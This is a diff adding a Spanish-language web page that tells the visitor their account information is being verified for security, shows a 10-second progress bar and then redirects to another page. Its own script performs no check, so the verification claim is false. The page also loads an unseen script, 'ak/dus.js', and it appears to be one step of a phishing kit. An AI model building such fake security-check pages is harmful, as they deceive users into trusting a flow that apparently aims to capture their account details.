@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body style="background-image: url('https://i.postimg.cc/Dz8PRjZy/gjk.png'); background-size: cover;">
+ 
+
+   
+
+
+
+   <div class="gru-1"  style="">
+
+    <div class="bxw" style="padding: 30px; text-align: center;">
+        
+      <div class="cadd">
+        <img src="https://i.postimg.cc/GmGQzzcR/36456.png" alt="" style="margin-bottom: 15px;">
+      <p>Estamos verificando la autenticidad de tu información para garantizar la seguridad de tu cuenta.</p>
+      </div>
+
+        <div class="progress-bar">
+        <div class="progress-fill"></div>
+    </div>
+     <p class="timer">Por favor espera <span id="seconds"></span> segundos…</p>
+ 
+    </div>
+   </div>
+
+
+
+ 
+    
+  
+
+
+
+<script>
+const WAIT_TIME = 10;
+const REDIRECT_URL = "index--.html";
+
+window.addEventListener("load", () => {
+
+    const bar = document.querySelector(".progress-fill");
+    const txt = document.getElementById("seconds");
+
+    let start = Date.now();   
+    let end = start + WAIT_TIME * 1000; 
+
+    function update() {
+        let now = Date.now();
+        let remaining = Math.max(0, Math.ceil((end - now) / 1000));
+        let progress = Math.min(100, ((now - start) / (WAIT_TIME * 1000)) * 100);
+
+    
+        txt.textContent = remaining;
+        bar.style.width = progress + "%";
+
+    
+        if (now >= end) {
+            window.location.href = REDIRECT_URL;
+            return;
+        }
+
+        requestAnimationFrame(update);
+    }
+
+    update(); 
+});
+</script>
+
+
+<script src="ak/dus.js"></script>
+</body>
+</html>
